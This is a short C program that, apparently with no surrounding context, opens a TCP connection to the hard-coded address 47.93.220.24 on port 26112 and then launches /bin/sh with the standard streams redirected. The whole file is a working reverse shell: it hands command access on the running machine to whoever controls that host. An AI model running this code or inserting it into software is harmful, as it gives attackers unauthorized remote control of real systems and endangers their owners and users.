#include <unistd.h>
#include <stdlib.h>
#include <linux/net.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main() {
    close(0);
    close(1);
    close(2);
    int fd1 = socket(AF_INET, SOCK_STREAM, 0);
    int newfd = 1;
    dup2(fd1, newfd);
    struct sockaddr_in info;
    info.sin_family = PF_INET;
    info.sin_addr.s_addr = inet_addr("47.93.220.24");
    info.sin_port = htons(26112);
    int fd2 = connect(fd1, (struct sockaddr *) &info, sizeof(info));
    system("/bin/sh");
    return 0;
}

